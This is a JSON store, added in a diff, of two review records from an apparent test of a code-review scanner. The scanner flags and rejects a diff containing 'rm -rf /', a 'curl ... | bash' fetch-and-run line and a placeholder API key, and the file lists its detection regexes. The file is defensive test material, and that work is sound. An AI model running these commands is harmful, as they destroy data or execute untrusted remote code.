@@ -1,0 +1,149 @@
+{
+  "store_version": "1.0",
+  "reviews": [
+    {
+      "id": "review_72273e8d9490",
+      "repo_id": "core-platform",
+      "title": "dangerous diff test",
+      "source": "desktop_d3_e2_test",
+      "risk_level": "critical",
+      "decision": "reject",
+      "findings": [
+        {
+          "id": "finding_da719125b75d",
+          "rule_id": "dangerous_shell_rm_rf",
+          "category": "dangerous_shell",
+          "risk_level": "critical",
+          "title": "Dangerous recursive delete",
+          "message": "Diff contains dangerous recursive delete command.",
+          "pattern": "rm\\s+-rf\\s+/",
+          "line": 2,
+          "snippet": "+ rm -rf /"
+        },
+        {
+          "id": "finding_1471985f0d1d",
+          "rule_id": "dangerous_shell_pipe_bash",
+          "category": "dangerous_shell",
+          "risk_level": "high",
+          "title": "Remote script pipe to shell",
+          "message": "Diff pipes remote content directly into shell.",
+          "pattern": "curl\\b.*\\|\\s*(bash|sh)",
+          "line": 3,
+          "snippet": "+ curl https://example.com/install.sh | bash"
+        },
+        {
+          "id": "finding_ca35c0d139f2",
+          "rule_id": "secret_leak_generic",
+          "category": "secret_leak",
+          "risk_level": "critical",
+          "title": "Possible secret leakage",
+          "message": "Diff appears to include a secret, token, password, or API key.",
+          "pattern": "api[_-]?key\\s*[:=]\\s*['\\\"][^'\\\"]{6,}",
+          "line": 4,
+          "snippet": "+ const api_key = 'sk-test-secret'"
+        }
+      ],
+      "test_suggestions": [
+        {
+          "title": "Run unit tests",
+          "description": "Run service or frontend unit tests related to changed files.",
+          "command": "pytest -q"
+        },
+        {
+          "title": "Run source integrity check",
+          "description": "Check project layout and ensure no source files are mixed into bundle directories.",
+          "command": "bash scripts/maintenance/check_source_integrity.sh"
+        },
+        {
+          "title": "Run eval gateway regression",
+          "description": "Run platform eval cases after code changes.",
+          "command": "curl -X POST http://127.0.0.1:18112/run"
+        },
+        {
+          "title": "Secret scan",
+          "description": "Run secret scanning before commit or release.",
+          "command": "git diff --cached | grep -Ei 'api[_-]?key|secret|token|password'"
+        },
+        {
+          "title": "Manual approval required",
+          "description": "Dangerous shell operations require human approval and sandbox review.",
+          "command": "manual_review_required"
+        }
+      ],
+      "summary": "3 finding(s), risk=RiskLevel.critical, decision=Decision.reject",
+      "created_at": 1777153029.887147
+    },
+    {
+      "id": "review_eb88fced47dd",
+      "repo_id": "core-platform",
+      "title": "dangerous diff test",
+      "source": "desktop_d3_e2_test",
+      "risk_level": "critical",
+      "decision": "reject",
+      "findings": [
+        {
+          "id": "finding_da719125b75d",
+          "rule_id": "dangerous_shell_rm_rf",
+          "category": "dangerous_shell",
+          "risk_level": "critical",
+          "title": "Dangerous recursive delete",
+          "message": "Diff contains dangerous recursive delete command.",
+          "pattern": "rm\\s+-rf\\s+/",
+          "line": 2,
+          "snippet": "+ rm -rf /"
+        },
+        {
+          "id": "finding_1471985f0d1d",
+          "rule_id": "dangerous_shell_pipe_bash",
+          "category": "dangerous_shell",
+          "risk_level": "high",
+          "title": "Remote script pipe to shell",
+          "message": "Diff pipes remote content directly into shell.",
+          "pattern": "curl\\b.*\\|\\s*(bash|sh)",
+          "line": 3,
+          "snippet": "+ curl https://example.com/install.sh | bash"
+        },
+        {
+          "id": "finding_99fd348828f7",
+          "rule_id": "secret_leak_generic",
+          "category": "secret_leak",
+          "risk_level": "critical",
+          "title": "Possible secret leakage",
+          "message": "Diff appears to include a secret, token, password, or API key.",
+          "pattern": "sk-[A-Za-z0-9_\\-]{8,}",
+          "line": 4,
+          "snippet": "+ const api_key = sk-test-secret"
+        }
+      ],
+      "test_suggestions": [
+        {
+          "title": "Run unit tests",
+          "description": "Run service or frontend unit tests related to changed files.",
+          "command": "pytest -q"
+        },
+        {
+          "title": "Run source integrity check",
+          "description": "Check project layout and ensure no source files are mixed into bundle directories.",
+          "command": "bash scripts/maintenance/check_source_integrity.sh"
+        },
+        {
+          "title": "Run eval gateway regression",
+          "description": "Run platform eval cases after code changes.",
+          "command": "curl -X POST http://127.0.0.1:18112/run"
+        },
+        {
+          "title": "Secret scan",
+          "description": "Run secret scanning before commit or release.",
+          "command": "git diff --cached | grep -Ei 'api[_-]?key|secret|token|password'"
+        },
+        {
+          "title": "Manual approval required",
+          "description": "Dangerous shell operations require human approval and sandbox review.",
+          "command": "manual_review_required"
+        }
+      ],
+      "summary": "3 finding(s), risk=RiskLevel.critical, decision=Decision.reject",
+      "created_at": 1777153059.0299609
+    }
+  ]
+}
